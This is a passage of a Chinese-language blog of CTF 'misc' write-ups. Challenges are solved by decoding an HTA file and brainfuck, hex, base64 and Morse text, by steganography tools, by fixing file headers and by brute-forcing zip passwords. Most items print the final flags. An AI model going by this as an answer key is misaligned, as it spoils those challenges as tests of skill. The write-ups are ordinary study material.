+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">console.log(unescape(&#x27;%3Chtml%3E%0A%3Cbody%3E%0A%0A%3C%21DOCTYPE%20html%3E%0A%3Chtml%3E%0A%3Chead%3E%0A%20%20%20%20%3Ctitle%3EDo%20You%20Know%20js%3C%2Ftitle%3E%0A%3CHTA%3AAPPLICATION%0A%20%20APPLICATIONNAME%3D%22Do%20You%20Know%20js%22%0A%20%20ID%3D%22Inception%22%0A%20%20VERSION%3D%221.0%22%0A%20%20SCROLL%3D%22no%22%2F%3E%0A%20%0A%3Cstyle%20type%3D%22text%2Fcss%22%3E%0A%3C%2Fhead%3E%0A%20%20%20%20%3Cdiv%20id%3D%22feature%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%22content%0A%09%09%09%09%3C%2Fstyle%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20id%3D%22unavailable%22%20class%3D%22loading%22%3EBuilding%20js.....%3C%2Fh1%3E%0A%09%09%09%09%3Cscript%20type%3D%22text%2Fjavascript%22%20language%3D%22javascript%22%3E%0A%09%09%09%09%09function%20RunFile%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20WshShell%20%3D%20new%20ActiveXObject%28%22WScript.Shell%22%29%3B%0A%09%09%09%09%09WshShell.Run%28%22notepad%20%25windir%25%2FDesktop%2Fjs.txt%22%2C%201%2C%20false%29%3B%0A%20%20%20%20%20%20%20%20%20%20%2F*%20var%20oExec%20%3D%20WshShell.Exec%28%22notepad%22%29%3B%20*%2F%0A%09%09%09%09%09%7D%0A%09%09%09%09%3C%2Fscript%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3Cbody%3E%0A%09%3Cinput%20type%3D%22button%22%20value%3D%22Implant%20Inception%20Here%22%20onclick%3D%22RunFile%28%29%3B%22%2F%3E%0A%09%3Cp%20style%3D%22color%3Awhite%3B%22%3E%0A%0A%2B%2B%2B%2B%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B%2B..%20%2B%2B.-.%20%2B%2B.--%20--.%2B%2B%20%2B%2B.--%20%0A-.-.-%20--.%2B%2B%20%2B%2B%2B%2B.%0A%2B.---%20-..%2B%2B%20%2B%2B.%3C%2B%20%2B%2B%5B-%3E%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%5B-%20%0A%3E---%3C%20%5D%3E---%20---.%2B%20%2B%2B%2B%2B.%20-----%0A.%2B%2B%2B.%20...--%20---.%2B%20%2B%2B%2B%2B.%20---.%2B%20%2B%2B.--%20---.%2B%20%2B%2B%2B%2B.%20---..%20%2B%2B%2B%2B%2B%20%2B.---%20----.%0A%3C%2B%2B%2B%2B%20%5B-%3E%2B%2B%20%2B%2B%3C%5D%3E%20%2B%2B.%3C%2B%20%2B%2B%2B%5B-%20%3E----%20%3C%5D%3E-.%20---.%2B%0A%20%2B%2B%2B%2B%2B%20.----%20-.%2B%2B.%20%2B%2B.%2B.%0A--.--%20.%3C%2B%2B%2B%20%2B%5B-%3E%2B%20%2B%2B%2B%3C%5D%20%3E%2B%2B.%3C%20%2B%2B%2B%2B%5B%20-%3E---%20-%3C%5D%3E-%20%0A.%2B.-.%20---.%2B%20%2B%2B.%2B.%20-.%2B%2B%2B%0A%2B.---%20--.%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20.%3C%2B%2B%2B%20%5B-%3E--%20-%3C%5D%3E-%20----.%20----.%20%2B.%2B%2B%2B%20%2B.---%0A-.---%20.%2B%2B%2B.%20-..%3C%2B%20%2B%2B%2B%5B-%20%3E%2B%2B%2B%2B%20%3C%5D%3E%2B%2B%20%0A.%3C%2B%2B%2B%20%2B%5B-%3E-%20---%3C%5D%20%3E-.%2B%2B%20%2B%2B%2B.-%20----.%0A%2B%2B%2B..%20---.%2B%20%2B%2B.--%20--.%2B.%20..%2B%2B%2B%20%2B.-.-%20----.%20%2B%2B%2B%2B%2B%20%0A.----%20.%2B.%2B%2B%20%2B%2B.--%20--.%2B%2B%0A%2B%2B.-.%20----.%20%2B.-.%2B%20%2B%2B%2B%2B.%20%0A%3C%2B%2B%2B%5B%20-%3E%2B%2B%2B%20%3C%5D%3E%2B%2B%20%2B%2B.%3C%0A%3C%2Fp%3E%0A%3C%2Fbody%3E%0A%3C%2Fbody%3E%0A%20%20%3C%2Fhtml%3E%0A&#x27;));<br></code></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Do You Know js<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">HTA:APPLICATION</span></span><br><span class="hljs-tag">  <span class="hljs-attr">APPLICATIONNAME</span>=<span class="hljs-string">&quot;Do You Know js&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">ID</span>=<span class="hljs-string">&quot;Inception&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">VERSION</span>=<span class="hljs-string">&quot;1.0&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">SCROLL</span>=<span class="hljs-string">&quot;no&quot;</span>/&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;feature&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;content</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">				</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;unavailable&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;loading&quot;</span>&gt;</span>Building js.....<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>				<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">					<span class="hljs-keyword">function</span> <span class="hljs-title function_">RunFile</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">var</span> <span class="hljs-title class_">WshShell</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&quot;WScript.Shell&quot;</span>);</span><br><span class="language-javascript">					<span class="hljs-title class_">WshShell</span>.<span class="hljs-title class_">Run</span>(<span class="hljs-string">&quot;notepad %windir%/Desktop/js.txt&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);</span><br><span class="language-javascript">          <span class="hljs-comment">/* var oExec = WshShell.Exec(&quot;notepad&quot;); */</span></span><br><span class="language-javascript">					&#125;</span><br><span class="language-javascript">				</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Implant Inception Here&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;RunFile();&quot;</span>/&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:white;&quot;</span>&gt;</span><br><br>+++++ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- <br>-.-.- --.++ ++++.<br>+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- <br>&gt;---&lt; ]&gt;--- ---.+ ++++. -----<br>.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.<br>&lt;++++ [-&gt;++ ++&lt;]&gt; ++.&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+<br> +++++ .---- -.++. ++.+.<br>--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- <br>.+.-. ---.+ ++.+. -.+++<br>+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---<br>-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ <br>.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.<br>+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ <br>.---- .+.++ ++.-- --.++<br>++.-. ----. +.-.+ ++++. <br>&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>brainfuck解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D<br></code></pre></td></tr></table></figure>
+<p>每两位分割 将十六进制转成ascii</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&#x27;446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D&#x27;</span><br>dic = []<br>count = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s),<span class="hljs-number">2</span>):<br>    dic.append(s[i:i+<span class="hljs-number">2</span>])<br>    <br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>    <span class="hljs-keyword">try</span>:<br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
+<h3 id="19、-Dest0g3-520迎新赛-Pngenius"><a href="#19、-Dest0g3-520迎新赛-Pngenius" class="headerlink" title="19、[Dest0g3 520迎新赛]Pngenius"></a>19、[Dest0g3 520迎新赛]Pngenius</h3><p>先zsteg查看图片 发现一个password<br>再binwalk分离 得到压缩包<br>使用password解开压缩包 得到flag</p>
+<h3 id="20、-BJDCTF-2nd-A-Beautiful-Picture"><a href="#20、-BJDCTF-2nd-A-Beautiful-Picture" class="headerlink" title="20、[BJDCTF 2nd]A_Beautiful_Picture"></a>20、[BJDCTF 2nd]A_Beautiful_Picture</h3><p>爆破宽高即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag&#123;PnG_He1ghT_1s_WR0ng&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="21、-BJDCTF-2nd-小姐姐-y1ng"><a href="#21、-BJDCTF-2nd-小姐姐-y1ng" class="headerlink" title="21、[BJDCTF 2nd]小姐姐-y1ng"></a>21、[BJDCTF 2nd]小姐姐-y1ng</h3><p>linux中运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">strings xiaojiejie.png | grep BJD<br></code></pre></td></tr></table></figure>
+<p>得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag&#123;haokanma_xjj&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="22、-NewStarCTF-2023-公开赛道-大怨种"><a href="#22、-NewStarCTF-2023-公开赛道-大怨种" class="headerlink" title="22、[NewStarCTF 2023 公开赛道]大怨种"></a>22、[NewStarCTF 2023 公开赛道]大怨种</h3><p>打开图片有张二维码一闪而过<br>使用stegsolve的frame browser模块即可<br>然后汉信码识别即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://tuzim.net/hxdecode/<br></code></pre></td></tr></table></figure>
+<h3 id="23、-NewStarCTF-公开赛赛道-奇怪的文本"><a href="#23、-NewStarCTF-公开赛赛道-奇怪的文本" class="headerlink" title="23、[NewStarCTF 公开赛赛道]奇怪的文本"></a>23、[NewStarCTF 公开赛赛道]奇怪的文本</h3><p>字频统计即可</p>
+<h3 id="24、-NewStarCTF-公开赛赛道-qsdz’s-girlfriend-1"><a href="#24、-NewStarCTF-公开赛赛道-qsdz’s-girlfriend-1" class="headerlink" title="24、[NewStarCTF 公开赛赛道]qsdz’s girlfriend 1"></a>24、[NewStarCTF 公开赛赛道]qsdz’s girlfriend 1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">我失忆了，这是我在我桌面上发现的压缩包，可是我忘记了压缩包密码了...请问你能帮助我找到我女朋友的名字吗？flag格式为：flag&#123;女朋友名字_女朋友生日&#125;<br></code></pre></td></tr></table></figure>
+<p>解压压缩包需要密码<br>打开压缩包 在注释里面找到了提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">压缩包密码是我女朋友的生日！<br></code></pre></td></tr></table></figure>
+<p>则ziperello爆破8位数字 猜测20开头 爆破得到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">20031201<br></code></pre></td></tr></table></figure>
+<p>得到一张图片 谷歌识图找到名字即可</p>
+<h3 id="25、-Dest0g3-520迎新赛-EasyEncode"><a href="#25、-Dest0g3-520迎新赛-EasyEncode" class="headerlink" title="25、[Dest0g3 520迎新赛]EasyEncode"></a>25、[Dest0g3 520迎新赛]EasyEncode</h3><p>爆破数字密码 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">100861<br></code></pre></td></tr></table></figure>
+<p>打开后发现是摩斯密码 –..的<br>翻译后是一大堆数字<br>十六进制转ascii<br>发现是unicode 因为都是\u<br>unicode解码后 又得到一串字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ%3D%3D<br></code></pre></td></tr></table></figure>
+<p>直接cyberchef 是base64加密</p>
+<h3 id="26、-NewStarCTF-公开赛赛道-Whats-HTTP"><a href="#26、-NewStarCTF-公开赛赛道-Whats-HTTP" class="headerlink" title="26、[NewStarCTF 公开赛赛道]Whats HTTP"></a>26、[NewStarCTF 公开赛赛道]Whats HTTP</h3><p>wireshark打开后 导出http对象  发现文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ssssssecret<br></code></pre></td></tr></table></figure>
+<p>python</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>b64decode(<span class="hljs-string">&#x27;NjY2YzYxNjc3YjM0NjYzMzMzMzYzNDM5NjQzMDMzMzA2MzM2MzczNzM4MzQzMjM2MzkzNzMxNjIzNTM0NjQ2NDM3MzI2NTYzNjU3ZA==&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p>之后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">b&#x27;666c61677b34663333363439643033306336373738343236393731623534646437326563657d&#x27;<br></code></pre></td></tr></table></figure>
+<p>再运行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;666c61677b34663333363439643033306336373738343236393731623534646437326563657d&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<h3 id="27、-2022DASCTF-MAY-出题人挑战赛-不懂PCB的厨师不是好黑客"><a href="#27、-2022DASCTF-MAY-出题人挑战赛-不懂PCB的厨师不是好黑客" class="headerlink" title="27、[2022DASCTF MAY 出题人挑战赛]不懂PCB的厨师不是好黑客"></a>27、[2022DASCTF MAY 出题人挑战赛]不懂PCB的厨师不是好黑客</h3><p>payload 在对应文件夹内运行即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">grep -rn &#x27;DASCTF&#x27; ./*<br></code></pre></td></tr></table></figure>
+<h3 id="28、-BJDCTF-2nd-最简单的misc-y1ng"><a href="#28、-BJDCTF-2nd-最简单的misc-y1ng" class="headerlink" title="28、[BJDCTF 2nd]最简单的misc-y1ng"></a>28、[BJDCTF 2nd]最简单的misc-y1ng</h3><p>zip伪加密<br>缺少png头 补上即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">89 50 47 4e<br></code></pre></td></tr></table></figure>
+<p>图片上有一串数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">42A447B79316E677A756973687561697D<br></code></pre></td></tr></table></figure>
+<p>hex解码即可得到flag</p>
+<h3 id="29、-陇原战”疫”2021网络安全大赛-soEasyCheckin"><a href="#29、-陇原战”疫”2021网络安全大赛-soEasyCheckin" class="headerlink" title="29、[陇原战”疫”2021网络安全大赛]soEasyCheckin"></a>29、[陇原战”疫”2021网络安全大赛]soEasyCheckin</h3><p>一开始解码失败<br>发现是因为混入了一个$字符 删除后 对剩余两部分分别进行解码<br>前半部分是base32 解码出来之后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">平等和谐自由平等平等自由法治友善平等平等民主公正敬业和谐文明平等爱国公正敬业公正诚信自由和谐民主平等爱国公正敬业公正平等和谐文明自由友善公正公正敬业和谐自由文明友善法治自由友善公正公正友善敬业公正诚信自由公正法治和谐和谐平等敬业法治平等公正民主公正诚信自由和谐<br></code></pre></td></tr></table></figure>
+<p>核心价值观编码<br>解码时抱错 把最后两个和谐删除即可<br>得到前半部分的flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SET&#123;Qi2Xin1Xie2Li4-Long3Yuan<br></code></pre></td></tr></table></figure>
+<p>再解码后半部分<br>base32后乱码 原因是长度不够 在前面添上777解码成功<br>将得到的内容 hex解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">6988ee5b9b3e7ad89e58f8be59684e887aae794b1e585ace6ada3e788b1e59bbde585ace6ada3e6b091e4b8bbe585ace6ada3e58f8be59684e788b1e59bbde5928ce8b090e887aae794b1e5b9b3e7ad89e695ace4b89ae585ace6ada3e695ace4b89ae5928ce8b090e887aae794b1e6b395e6b2bbe8af9ae4bfa1e5928ce8b090<br></code></pre></td></tr></table></figure>
+<p>乱码 删除掉第一个6之后即可正常解码 再次核心价值观解码即可得到后半段flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Zhan4Yi4&#125;<br></code></pre></td></tr></table></figure>
+<p>拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SET&#123;Qi2Xin1Xie2Li4-Long3YuanZhan4Yi4&#125;<br></code></pre></td></tr></table></figure>
+<p>yuan后面应该还有一个数字 经测试 为2</p>
+<h3 id="30、-VNCTF2022公开赛-仔细找找"><a href="#30、-VNCTF2022公开赛-仔细找找" class="headerlink" title="30、[VNCTF2022公开赛]仔细找找"></a>30、[VNCTF2022公开赛]仔细找找</h3><p>取出杂色点即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.png&quot;</span>)<br>img = img.resize((<span class="hljs-number">79</span>, <span class="hljs-number">71</span>), Image.NEAREST)<br>img.save(<span class="hljs-string">&quot;flag2.png&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">vnctf&#123;34aE@w&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="31、-Dest0g3-520迎新赛-OCR"><a href="#31、-Dest0g3-520迎新赛-OCR" class="headerlink" title="31、[Dest0g3 520迎新赛]OCR"></a>31、[Dest0g3 520迎新赛]OCR</h3><p>宽高修复之后 得到图片文件 图片上都是十六进制 保存为7z文件后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">377ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D0022194A676D2FDE351A055c168F9710364AE2D581126E378F3B4c47E15E2E80B74234B849430A221F40C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D0357995A2FB65D31CD99c853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FFE31ED0C0CEF0CA0B68C0CCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFC0FEAAE92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EFDE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C5595E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074c27F81c719D98717F4ECD32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F0600FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A0395DB9A445B94C44771B406F962B1CFC8535BA0D3EE3DDDEB876C95092AAB192B168A732F3A7B9E8156c403c583983F5527A0D6c5D6928481D56955474046D9FC17A2DE21F3D6FC4c69644E7c6A141BE948A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B010001212101000C84D100080A0196EAFE6000000501190A0000000000000000000011190044006500730074003000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000000000<br></code></pre></td></tr></table></figure>
+<p>得到一串base64加密后的字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">RGVzdDBnM3szNDUxMjA5OC0zMzA5LTc3MTItODg2NS03ODM0NjAyMjE2NDd9<br></code></pre></td></tr></table></figure>
+<p>解码后即可得到flag</p>
+<h3 id="32、-NewStarCTF-2023-公开赛道-滴滴滴"><a href="#32、-NewStarCTF-2023-公开赛道-滴滴滴" class="headerlink" title="32、[NewStarCTF 2023 公开赛道]滴滴滴"></a>32、[NewStarCTF 2023 公开赛道]滴滴滴</h3><p>解压后得到两个文件<br>一个是音频文件<br>另一个是一张图片<br>对音频文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">dtfm2num 1.wav<br></code></pre></td></tr></table></figure>
+<p>得到dtfm数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">52563319066<br></code></pre></td></tr></table></figure>
+<p>再使用steghide对图片进行解密即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">steghide extract -sf secret.jpg -p 52563319066<br></code></pre></td></tr></table></figure>
+<h3 id="33、-NewStarCTF-2023-公开赛道-阳光开朗大男孩"><a href="#33、-NewStarCTF-2023-公开赛道-阳光开朗大男孩" class="headerlink" title="33、[NewStarCTF 2023 公开赛道]阳光开朗大男孩"></a>33、[NewStarCTF 2023 公开赛道]阳光开朗大男孩</h3><p>flag.txt文件中是一大堆表情<br>需要使用emoji-aes进行解密<br>但是emoji-aes解密还需要key 那么key就在secret.txt文件当中<br>显然是社会主义核心价值观解密 得到key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">this_password_is_s000_h4rd_p4sssw0rdddd<br></code></pre></td></tr></table></figure>
+<p>key为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">s000_h4rd_p4sssw0rdddd<br></code></pre></td></tr></table></figure>
+<p>经过emoji-aes decrypt后 即可得到flag</p>
+<h3 id="34、-NewStarCTF-公开赛赛道-奇怪的PDF"><a href="#34、-NewStarCTF-公开赛赛道-奇怪的PDF" class="headerlink" title="34、[NewStarCTF 公开赛赛道]奇怪的PDF"></a>34、[NewStarCTF 公开赛赛道]奇怪的PDF</h3><p>发现缺少文件头 补全即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">25 50 44 46<br></code></pre></td></tr></table></figure>
+<p>使用wbstego进行解密即可 无密码 得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag&#123;PDF_1s_n0t_strang3&#125;<br></code></pre></td></tr></table></figure>
